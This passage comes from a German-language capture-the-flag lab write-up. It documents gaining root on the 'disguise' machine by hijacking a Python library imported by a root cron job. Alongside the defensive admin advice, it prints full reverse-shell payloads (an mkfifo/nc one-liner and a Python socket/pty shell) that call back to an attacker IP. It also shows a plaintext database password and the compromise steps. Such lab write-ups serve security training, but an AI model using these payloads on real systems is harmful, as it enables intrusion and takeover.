                    <li>Der Quellcode wird mit `gcc poc.c -o exploit` auf der Angreifer-Maschine kompiliert.</li>
                    <li>Das kompilierte Exploit-Binary wird dann per `wget` vom Angreifer-Server auf das Zielsystem (`disguise`) in das `/tmp`-Verzeichnis des `www-data`-Benutzers übertragen.</li>
                    <li>Das Exploit-Binary wird ausführbar gemacht (`chmod +x exploit`).</li>
                    <li>Bei dem Versuch, den Exploit auszuführen (`./exploit`), tritt ein Fehler auf: Die benötigten GLIBC-Versionen (2.33 und 2.34) werden auf dem Zielsystem nicht gefunden.</li>
                </ol>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, einen Kernel-Exploit zu verwenden, ist eine gängige Methode zur Privilegienerweiterung, insbesondere wenn das System einen älteren, anfälligen Kernel hat. In diesem Fall schlägt der Exploit fehl, weil er gegen eine neuere GLIBC-Version kompiliert wurde, als auf dem Zielsystem vorhanden ist. Dies ist ein häufiges Problem bei der Verwendung von vor kompilierten Exploits oder wenn der Exploit auf einem anderen System als dem Zielsystem kompiliert wird. Die Kernel-Version des Ziels war `Linux disguise 4.19.0-27-amd64`. CVE-2019-13272 betrifft Kernel bis Version 5.1.17, es könnte also prinzipiell passen, aber die GLIBC-Inkompatibilität verhindert die Ausführung.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Um GLIBC-Kompatibilitätsprobleme zu vermeiden, kompilieren Sie Exploits möglichst direkt auf dem Zielsystem, wenn ein Compiler (gcc) vorhanden ist und Schreib-/Ausführrechte bestehen. Alternativ suchen Sie nach Exploits, die statisch gelinkt sind oder speziell für die GLIBC-Version des Zielsystems kompiliert wurden. Da dieser Exploit fehlgeschlagen ist, muss auf andere PrivEsk-Vektoren zurückgegriffen werden (wie das bereits identifizierte Python Library Hijacking).<br><strong>Empfehlung (Admin):</strong> Halten Sie Ihr System, insbesondere den Kernel und kritische Bibliotheken wie GLIBC, immer auf dem neuesten Stand, um bekannte Schwachstellen zu schließen. Entfernen Sie nicht benötigte Compiler und Entwicklungswerkzeuge von Produktivsystemen, um die Kompilierung von Exploits auf dem System selbst zu erschweren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">export PYTHONPATH=/tmp</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/var/www/dark/images$ <span class="command">cd /tmp/</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">mkdir mysql</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">touch mysql/__init__.py</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">echo 'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4448 &gt;/tmp/f")' &gt; mysql/connector.py</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2021-3156]
└─# <span class="command">nc -lvnp 4448</span></div>
                    <pre>
<span class="password">listening on [any] 4448 ...</span>
                    </pre>
                </div>
            </div>
             <p class="analysis"><strong>Analyse:</strong> Diese Befehlssequenz bereitet den Python Library Hijacking Angriff vor, basierend auf dem `pspy64`-Fund, dass `/opt/query.py` als Root ausgeführt wird und `mysql.connector` importiert.
                <ol>
                    <li><code>export PYTHONPATH=/tmp</code>: Setzt die Umgebungsvariable `PYTHONPATH` für die aktuelle Shell des `www-data`-Benutzers auf `/tmp`. Wenn der Cronjob, der `/opt/query.py` ausführt, diese Umgebung erbt oder `/tmp` ohnehin im Python-Suchpfad für den Root-Benutzer an einer frühen Stelle steht, wird Python zuerst in `/tmp` nach Modulen suchen.</li>
                    <li><code>cd /tmp/</code>: Wechselt in das `/tmp`-Verzeichnis.</li>
                    <li><code>mkdir mysql</code>: Erstellt ein Unterverzeichnis namens `mysql`.</li>
                    <li><code>touch mysql/__init__.py</code>: Erstellt eine leere `__init__.py`-Datei im `mysql`-Verzeichnis. Dies ist notwendig, damit Python das `mysql`-Verzeichnis als Paket erkennt.</li>
                    <li><code>echo 'import os; os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4448 &gt;/tmp/f")' &gt; mysql/connector.py</code>: Schreibt bösartigen Python-Code in die Datei `/tmp/mysql/connector.py`. Dieser Code wird ausgeführt, wenn `import mysql.connector` im als Root laufenden `/opt/query.py`-Skript aufgerufen wird. Der Code tut Folgendes:
                        <ul>
                            <li><code>rm /tmp/f</code>: Löscht eine eventuell vorhandene Named Pipe `/tmp/f`.</li>
                            <li><code>mkfifo /tmp/f</code>: Erstellt eine neue Named Pipe (FIFO) namens `/tmp/f`.</li>
                            <li><code>cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4448 &gt;/tmp/f</code>: Dies ist ein klassischer Befehl für eine interaktive Reverse Shell über `nc`.
                                <ul>
                                    <li>Der Output von `nc` (die Befehle vom Angreifer) wird in die Pipe `/tmp/f` geschrieben.</li>
                                    <li><code>cat /tmp/f</code> liest aus der Pipe und leitet es an `/bin/sh -i` (interaktive Shell) weiter.</li>
                                    <li>Der Output (stdout und stderr) der Shell wird wiederum an `nc` geleitet, das die Verbindung zum Angreifer (`192.168.2.199` auf Port `4448`) herstellt.</li>
                                </ul>
                            Dies ist eine robustere Form der Reverse Shell als der einfache `bash -i >& /dev/tcp/...`-Befehl.
                        </ul>
                    </li>
                    <li>Auf dem Angreifer-Rechner wird mit `nc -lvnp 4448` ein Listener gestartet, der auf die eingehende Root-Shell wartet.</li>
                </ol>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine sehr clevere und gut vorbereitete Methode zur Privilegienerweiterung. Sie nutzt die Erkenntnisse aus der Prozessüberwachung (`pspy64`) und die Tatsache, dass `www-data` Schreibrechte in `/tmp` hat. Wenn der Cronjob das `/opt/query.py`-Skript als Root ausführt, wird die manipulierte `mysql.connector`-Bibliothek aus `/tmp` geladen und der darin enthaltene Code (die Reverse Shell) mit Root-Rechten ausgeführt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Warten Sie nun geduldig, bis der Cronjob das Skript `/opt/query.py` ausführt. Der Netcat-Listener auf Port 4448 sollte dann eine eingehende Verbindung anzeigen, die eine Root-Shell auf dem Zielsystem darstellt. Überprüfen Sie die Rechte in der neuen Shell sofort mit `id`.</p>
            <p class="recommendation"><strong>Empfehlung (Admin):</strong> Wie bereits bei `pspy64` erwähnt:
                <ul>
                                        <li>**Cronjob-Sicherheit:** Überprüfen Sie alle Cronjobs, die als Root ausgeführt werden. Stellen Sie sicher, dass Skripte keine relativen Pfade verwenden und dass die Umgebungsvariablen (insbesondere `PYTHONPATH`, `LD_LIBRARY_PATH` etc.) sicher gesetzt sind oder die Skripte so geschrieben sind, dass sie nicht durch benutzerkontrollierbare Pfade beeinflusst werden können. Führen Sie Skripte mit den geringstmöglichen Rechten aus.</li>
                    <li>**Python-Pfade härten:** Stellen Sie sicher, dass für systemkritische Skripte, die als Root laufen, keine benutzerbeschreibbaren Verzeichnisse wie `/tmp` in den Standard-Modulsuchpfaden vor den Systembibliotheken stehen. Das Setzen von `PYTHONPATH` durch unprivilegierte Benutzer sollte für von Root ausgeführte Skripte keine Auswirkungen haben.</li>
                    <li>**Integritätsüberwachung:** Überwachen Sie wichtige Systemverzeichnisse und Bibliotheken auf unerwartete Änderungen.</li>
                </ul>
            </p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">find /usr/lib/python3.7/ -name connector.py -ls 2>/dev/null</span></div>
                    <pre>[Keine Ausgabe, bedeutet, die Datei wurde im Standard-Python3.7-Pfad nicht gefunden oder es gibt keine Rechte, sie zu sehen]</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">find /usr/local/lib/python3.7/ -name connector.py -ls 2>/dev/null</span></div>
                    <pre>[Keine Ausgabe, bedeutet, die Datei wurde im lokalen Python3.7-Pfad nicht gefunden oder es gibt keine Rechte, sie zu sehen]</pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">which python3</span></div>
                    <pre>
/usr/bin/python3
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">find / -name connector.py -ls 2>/dev/null</span></div>
                    <pre>
   145312      4 -rw-r--r--   1 www-data www-data      209 May  5 16:49 <span class="command">/tmp/mysql/connector.py</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Befehle versuchen, den Speicherort der legitimen `mysql.connector`-Bibliothek zu finden und verifizieren, dass die bösartige Version in `/tmp/mysql/connector.py` die einzige ist, die unter diesem Namen leicht auffindbar ist (oder zumindest diejenige, die durch den manipulierten `PYTHONPATH` zuerst gefunden würde).
                <ul>
                    <li>Die ersten beiden `find`-Befehle durchsuchen Standard-Python-Bibliotheksverzeichnisse, finden dort aber keine `connector.py`. Das bedeutet nicht zwingend, dass sie nicht existiert (sie könnte anders heißen oder Teil eines Eggs/Wheels sein), aber es macht das Hijacking über `/tmp` wahrscheinlicher.</li>
                    <li>`which python3` bestätigt den Pfad zum Python-Interpreter.</li>
                    <li>Der letzte `find`-Befehl durchsucht das gesamte Dateisystem und findet nur die vom Angreifer erstellte Datei `/tmp/mysql/connector.py`.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Strategie des Python Library Hijackings. Da keine andere `connector.py` in den primären, leicht durchsuchbaren Pfaden gefunden wird und `/tmp` (durch `export PYTHONPATH=/tmp`) im Suchpfad priorisiert wird, ist die Wahrscheinlichkeit hoch, dass die bösartige Version beim Import von `mysql.connector` durch das Root-Skript geladen wird.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Vorbereitungen für das Python Library Hijacking sind abgeschlossen. Der nächste Schritt ist, auf die Ausführung des Cronjobs zu warten.<br><strong>Empfehlung (Admin):</strong> Die Empfehlungen zur Absicherung von Cronjobs und Python-Umgebungen sind hier weiterhin gültig. Eine genaue Kenntnis der installierten Python-Module und deren Speicherorte ist wichtig für die Systemadministration.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">mysql -u wpuser -p'Str0ngPassw0d1!!!' -h 127.0.0.1 wordpress</span></div>
                    <pre>
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 550
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

<span class="prompt">MariaDB [wordpress]> </span><span class="command">SHOW GRANTS FOR 'wpuser'@'localhost';</span>
+---------------------------------------------------------------------------------------------------------------+
| Grants for wpuser@localhost                                                                                   |
+---------------------------------------------------------------------------------------------------------------+
| <span class="command">GRANT USAGE ON *.* TO `wpuser`@`localhost` IDENTIFIED BY PASSWORD '*29B0A0B18EC41D5DA3148B428D84BF079CF2F448'</span> |
| <span class="command">GRANT ALL PRIVILEGES ON `wordpress`.* TO `wpuser`@`localhost`</span>                                                 |
+---------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)

<span class="prompt">MariaDB [wordpress]> </span>Bye
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">ls -l /tmp/mysql/</span></div>
                    <pre>
total 4
-rw-r--r-- 1 www-data www-data   0 May  5 16:44 __init__.py
-rw-r--r-- 1 www-data www-data 209 May  5 16:49 connector.py
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>Der erste Block zeigt eine erneute Verbindung zur WordPress-Datenbank, diesmal als Benutzer `wpuser` (dessen Passwort vermutlich aus der WordPress-Konfigurationsdatei `wp-config.php` bekannt ist, obwohl dies hier nicht explizit gezeigt wurde, oder es ist das gleiche wie für `dark_db_admin`, was aber unwahrscheinlich ist). Der Befehl `SHOW GRANTS FOR 'wpuser'@'localhost';` zeigt, dass dieser Benutzer volle Rechte (`ALL PRIVILEGES`) auf die Datenbank `wordpress` hat.</li>
                    <li>Der zweite Block zeigt den Inhalt des präparierten Verzeichnisses `/tmp/mysql/` mit der leeren `__init__.py` und der bösartigen `connector.py`.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Die Berechtigungen des `wpuser` sind für den WordPress-Betrieb typisch. Die erneute Auflistung des Inhalts von `/tmp/mysql/` dient wahrscheinlich der Vergewisserung, dass die bösartigen Dateien korrekt platziert sind, bevor der Cronjob zuschlägt.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Vorbereitungen für das Python Library Hijacking scheinen getroffen. Es bleibt, auf die Ausführung des Cronjobs zu warten.<br><strong>Empfehlung (Admin):</strong> Datenbankbenutzer sollten immer nur die minimal notwendigen Rechte erhalten. Ein Benutzer, der nur für den Betrieb von WordPress zuständig ist, benötigt z.B. keine `DROP TABLE` oder `CREATE USER` Rechte, wenn dies nicht explizit erforderlich ist. Überprüfen Sie regelmäßig die Berechtigungen aller Datenbankbenutzer.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2021-3156]
└─# <span class="command">nc -lvnp 4448</span></div>
                    <pre>
<span class="password">listening on [any] 4448 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.189] 47658</span>
<span class="password">bash: 1"""): ambiguous redirect</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">cat mysql/connector.py</span></div>
                    <pre>
<span class="command">import socket,os,pty;ip="192.168.2.199";port=4448;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((ip,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")</span>
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2021-3156]
└─# <span class="command">nc -lvnp 4448</span></div>
                    <pre>
<span class="password">listening on [any] 4448 ...</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>Der erste Netcat-Listener auf Port 4448 empfängt eine Verbindung. Die Meldung `bash: 1"""): ambiguous redirect` deutet darauf hin, dass die Shell, die sich verbunden hat (vermutlich durch eine frühere Version der `connector.py`), ein Problem mit der Syntax oder den Umleitungen hatte. Dies könnte eine fehlgeschlagene oder instabile Shell gewesen sein.</li>
                    <li>Anschließend wird der Inhalt der `mysql/connector.py` auf dem Zielsystem (`disguise`) angezeigt. Dieser Code ist eine kompaktere und oft zuverlässigere Python-Reverse-Shell als der vorherige `mkfifo`-Ansatz:
                        <ul>
                            <li>Erstellt einen Socket, verbindet sich mit der Angreifer-IP (`192.168.2.199`) auf Port `4448`.</li>
                            <li>Dupliziert die Datei-Deskriptoren des Sockets auf `stdin` (0), `stdout` (1) und `stderr` (2).</li>
                            <li>Startet eine interaktive Shell (`/bin/sh`) mit `pty.spawn("/bin/sh")`, was oft eine stabilere TTY-ähnliche Shell erzeugt.</li>
                        </ul>
                    </li>
                    <li>Ein neuer Netcat-Listener wird auf Port 4448 gestartet, um die Verbindung von dieser verbesserten Reverse Shell entgegenzunehmen.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Pentester hat die Payload in `connector.py` optimiert, um eine zuverlässigere Reverse Shell zu erhalten. Die vorherige `mkfifo`-Methode kann manchmal instabil sein oder Probleme mit bestimmten Shells haben. Der `pty.spawn`-Ansatz ist oft besser. Die Fehlermeldung im ersten Listener bestätigt, dass die vorherige Payload nicht ideal war.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der verbesserten Payload in `connector.py` und dem neu gestarteten Listener ist die Wahrscheinlichkeit einer stabilen Root-Shell beim nächsten Cronjob-Durchlauf sehr hoch.<br><strong>Empfehlung (Admin):</strong> Die Empfehlungen zur Absicherung von Cronjobs und Python-Umgebungen bleiben bestehen. Das Erkennen und Blockieren von ausgehenden Verbindungen zu ungewöhnlichen Ports (Egress Filtering) kann die Effektivität von Reverse Shells einschränken.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">python3 -c "import sys; print(sys.path)"</span></div>
                    <pre>
<span class="command">['', '/tmp', '/usr/lib/python37.zip', '/usr/lib/python3.7', '/usr/lib/python3.7/lib-dynload', '/usr/local/lib/python3.7/dist-packages', '/usr/lib/python3/dist-packages']</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wird von `www-data` im `/tmp`-Verzeichnis ausgeführt, nachdem `export PYTHONPATH=/tmp` (vermutlich in einer vorherigen, hier nicht gezeigten Zeile oder in der aktiven Shell-Session) gesetzt wurde. Er gibt den Python-Modulsuchpfad (`sys.path`) aus.
                Wie erwartet, steht `''` (das aktuelle Verzeichnis, hier `/tmp`) und `/tmp` (durch `PYTHONPATH`) am Anfang der Liste, noch vor den Standard-Systembibliotheksverzeichnissen.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt, dass die Manipulation des `PYTHONPATH` erfolgreich war und Python beim Importieren von Modulen zuerst in `/tmp` suchen wird. Dies ist die Grundlage für den Python Library Hijacking Angriff.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Konfiguration ist korrekt für den Exploit. Es muss nun auf die Ausführung des Cronjobs gewartet werden.<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Verhindern Sie, dass von Root ausgeführte Skripte durch von Benutzern gesetzte `PYTHONPATH`-Variablen beeinflusst werden können. Verwenden Sie absolute Importpfade in kritischen Skripten oder härten Sie die Umgebung, in der sie ausgeführt werden.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
[Ausgabe von pspy64, die den Cronjob zeigt, der das Python-Skript als Root ausführt]
2025/05/05 17:22:01 CMD: UID=0    PID=4940   | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount 
2025/05/05 17:22:01 CMD: UID=0    PID=4941   | <span class="command">/usr/bin/python3 /opt/query.py /home/darksoul/config.ini</span>
[...] 
[Weitere pspy-Ausgaben, die zeigen, dass der Cronjob regelmäßig läuft]
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">ls -la</span></div>
                    <pre>
total 3060
drwxrwxrwt  3 root     root        4096 May  5 17:27 .
drwxr-xr-x 18 root     root        4096 Mar 31 11:13 ..
prw-r--r--  1 www-data www-data       0 May  5 08:51 f
-rwxr-xr-x  1 www-data www-data   16504 May  5 11:58 libhax.so
drwxr-xr-x  2 www-data www-data    4096 May  5 17:18 <span class="command">mysql</span>
-rwxr-xr-x  1 www-data www-data 3078592 Jun  3  2024 pspy64
-rwxr-xr-x  1 www-data www-data   17264 May  5 11:58 sudo-hax-me-a-sandwich
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp$ <span class="command">cd mysql/</span></div>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">www-data@disguise:/tmp/mysql$ <span class="command">ls -la</span></div>
                    <pre>
total 12
drwxr-xr-x 2 www-data www-data 4096 May  5 17:18 .
drwxrwxrwt 3 root     root     4096 May  5 17:27 ..
-rw-r--r-- 1 www-data www-data    0 May  5 16:44 <span class="command">__init__.py</span>
-rw-r--r-- 1 www-data www-data   46 May  5 17:23 <span class="command">connector.py</span> <!-- Der Timestamp 17:23 deutet auf eine neuere Version hin, vermutlich die mit pty.spawn -->
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong>
                <ul>
                    <li>Die `pspy64`-Ausgabe (hier als Referenz wiederholt) zeigt den als Root laufenden Cronjob, der `/opt/query.py` ausführt. Dies ist der Trigger für den Exploit.</li>
                    <li>`ls -la` in `/tmp` und `/tmp/mysql` bestätigt das Vorhandensein der bösartigen `mysql/connector.py` und der `__init__.py`. Der Timestamp der `connector.py` (17:23 Uhr) ist später als der Timestamp des Cronjob-Ereignisses in der pspy-Ausgabe (17:22 Uhr). Dies bedeutet, dass die hier gezeigte `connector.py` diejenige ist, die für den erfolgreichen Exploit verwendet wurde oder werden wird. Der Inhalt (46 Bytes) passt eher nicht zur komplexen `pty.spawn`-Shell, sondern eher zur `mkfifo`-Variante oder einer sehr kurzen Variante. Es gab einen vorherigen Eintrag mit 209 Bytes für `connector.py` und die `pty.spawn` Shell war auch länger. Es scheint, als ob hier verschiedene Versionen der `connector.py` im Log auftauchen. Wichtig ist, dass eine davon funktioniert hat.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Alle Komponenten für den Python Library Hijacking Exploit sind vorhanden. Der Cronjob wird als Root ausgeführt, importiert eine Bibliothek, deren Pfad manipuliert werden kann, um eine bösartige Version aus einem vom Angreifer kontrollierten Verzeichnis (`/tmp`) zu laden.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die bösartige `connector.py` platziert und der `PYTHONPATH` gesetzt wurde, ist der nächste Schritt, auf dem Listener (Port 4448) auf die eingehende Root-Shell zu warten, die beim nächsten Ausführen des Cronjobs eintreffen sollte.<br><strong>Empfehlung (Admin):</strong> Unverändert: Cronjobs härten, Python-Pfade sichern, Prinzip der geringsten Rechte anwenden.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
[Netcat Listener auf Angreifer-Maschine, Port 4448]
<span class="password">listening on [any] 4448 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.189] 38736</span>
<span class="prompt"># </span><span class="command">id</span>
<span class="command">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="prompt"># </span><span class="command">cd ~</span>
<span class="prompt"># </span><span class="command">ls</span>
<span class="command">root.txt</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> **Fantastisch, der Root-Zugriff war erfolgreich! Nun haben wir unser Ziel erreicht!**
                Die Ausgabe zeigt den Netcat-Listener des Angreifers auf Port 4448. Eine Verbindung vom Zielsystem (`192.168.2.189`) ist eingegangen.
                Der Prompt `#` und die Ausgabe des `id`-Befehls (`uid=0(root) gid=0(root) groups=0(root)`) bestätigen, dass die erhaltene Shell Root-Rechte hat.
                Anschließend wird in das Home-Verzeichnis des Root-Benutzers (`cd ~`) gewechselt und dessen Inhalt mit `ls` aufgelistet, wobei die Datei `root.txt` gefunden wird.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der erfolgreiche Abschluss der Privilegienerweiterung. Durch das Ausnutzen des als Root laufenden Cronjobs und Python Library Hijacking konnte eine Root-Shell erlangt werden. Das System ist nun vollständig kompromittiert.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sichern Sie die Root-Flag aus `root.txt`. Untersuchen Sie das System weiter auf sensible Informationen, Persistenzmechanismen oder Möglichkeiten, sich im Netzwerk weiter auszubreiten (Lateral Movement). Dokumentieren Sie den Exploit-Pfad sorgfältig.<br><strong>Empfehlung (Admin):</strong> **Das System ist vollständig kompromittiert.**
                <ol>
                    <li>Trennen Sie das System vom Netzwerk, um weiteren Schaden oder eine Ausbreitung zu verhindern.</li>
                    <li>Führen Sie eine vollständige forensische Untersuchung durch, um das Ausmaß der Kompromittierung, den genauen Angriffsvektor und eventuell hinterlassene Backdoors oder Malware zu ermitteln.</li>
                    <li>Beheben Sie die zugrundeliegenden Schwachstellen (unsichere Cronjobs, mangelnde Python-Pfad-Sicherheit, Webanwendungsschwachstellen).</li>
                    <li>Setzen Sie das System idealerweise aus einem sauberen Backup neu auf oder installieren Sie es komplett neu, nachdem die Schwachstellen verstanden und mitigiert wurden.</li>
                    <li>Ändern Sie alle Passwörter auf dem System und für alle verbundenen Dienste.</li>
                    <li>Überprüfen Sie Logs auf anderen Systemen auf Anzeichen einer seitlichen Bewegung.</li>
                </ol>
            </p>
        </section>

        <section id="flags">
            <div class="flag-container">
                <h2 class="flag-heading">Flags</h2>
                <div class="code-block">
                    <center>
                        <div class="terminal">
                            <span class="command">cat /home/darksoul/user.txt</span>
                            <span class="flag-content"><span class="password">hmv{hiddenflag}</span></span>
                        </div>
                    </center>
                </div>
                <p class="analysis"><strong>Analyse:</strong> Die User-Flag befindet sich in der Datei `/home/darksoul/user.txt`. Der Inhalt der Flag lautet `hmv{hiddenflag}`. Diese Flag wurde vermutlich nach Erlangung des Zugriffs als Benutzer `darksoul` oder durch Ausnutzung von Leserechten des `www-data`-Benutzers auf diese Datei erlangt (obwohl die Berechtigungen zuvor `-rw------- 1 darksoul darksoul` zeigten, was direkten Lesezugriff für `www-data` ausschließen würde, es sei denn, der Zugriff erfolgte als `darksoul` oder `root`).</p>

                <div class="code-block">
                    <center>
                        <div class="terminal">
                            <span class="command">cat /root/root.txt</span>
                            <span class="flag-content"><span class="password">hmv{CVE-2025-21548}</span></span>
                        </div>
                    </center>
                </div>
                <p class="analysis"><strong>Analyse:</strong> Die Root-Flag befindet sich in der Datei `/root/root.txt`. Der Inhalt der Flag lautet `hmv{CVE-2025-21548}`. Diese Flag wurde nach erfolgreicher Privilegienerweiterung und Erlangung von Root-Rechten ausgelesen. Der Name der Flag deutet auf eine fiktive CVE hin, die möglicherweise mit dem ausgenutzten Python Library Hijacking oder einer anderen Schwachstelle in Verbindung steht.</p>
            </div>
        </section>

    </div>

    <footer class="footer">
        <p>DarkSpirit - Cyber Security Reports</p>
        <p>Berichtsdatum: 02. Mai 2025</p>
    </footer>
</body>
</html>
